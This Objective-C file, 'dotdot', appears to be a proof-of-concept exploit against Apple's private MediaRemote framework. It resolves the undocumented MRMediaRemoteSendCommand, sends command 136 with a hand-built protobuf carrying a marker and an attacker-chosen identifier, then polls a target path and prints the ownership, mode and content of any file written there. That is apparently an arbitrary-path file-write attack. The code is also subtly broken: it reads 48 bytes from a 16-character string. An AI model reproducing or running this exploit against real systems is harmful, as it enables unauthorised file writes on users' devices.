//
//  dotdot.m
//  dotdot
//
//  Created by roooot on 03.08.26.
//  Copyright (C) 2026 roooot
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU Affero General Public License as published
//  by the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  You can find the full license text at:
//  https://www.gnu.org/licenses/agpl-3.0.html
//

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

static NSData *tagged_field(int field, NSData *payload) {
    uint8_t tag = (field << 3) | 2;
    NSMutableData *d = [NSMutableData dataWithBytes:&tag length:1];
    uint64_t len = payload.length;
    while (len >= 0x80) { uint8_t b = (len & 0x7f) | 0x80; [d appendBytes:&b length:1]; len >>= 7; }
    uint8_t b = len; [d appendBytes:&b length:1]; [d appendData:payload];
    return d;
}

// writes successfully but cleanup deletes file after...
int dd_write(const char *identifier, const char *targetPath) {
    dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote", RTLD_NOW);

    typedef void (^res)(NSDictionary *);
    typedef void (*send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, res);

    send_fn fn = (send_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteSendCommand");
    if (!fn) return 1;

    NSData *marker = [NSData dataWithBytes:"roooot_was_here\n" length:48];

    NSMutableData *proto = [NSMutableData dataWithData:tagged_field(1, marker)];
    [proto appendData:tagged_field(2, [[NSString stringWithUTF8String:identifier] dataUsingEncoding:NSUTF8StringEncoding])];

    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto }, dispatch_get_main_queue(), ^(NSDictionary *r){});

    for (int i = 0; i < 3000000; i++) {
        struct stat st;

        if (stat(targetPath, &st) == 0) {
            int fd = open(targetPath, O_RDONLY);
            char buf[256] = {0};
            ssize_t n = fd >= 0 ? read(fd, buf, sizeof(buf) - 1) : 0;
            if (fd >= 0) close(fd);

            // Report what we found regardless of uid
            printf("(dd) found: uid=%d gid=%d mode=%o size=%lld\n",
                   st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size);
            if (n > 0) printf("(dd) content: %s", buf);
            return 0;
        }
    }

    return 1;
}
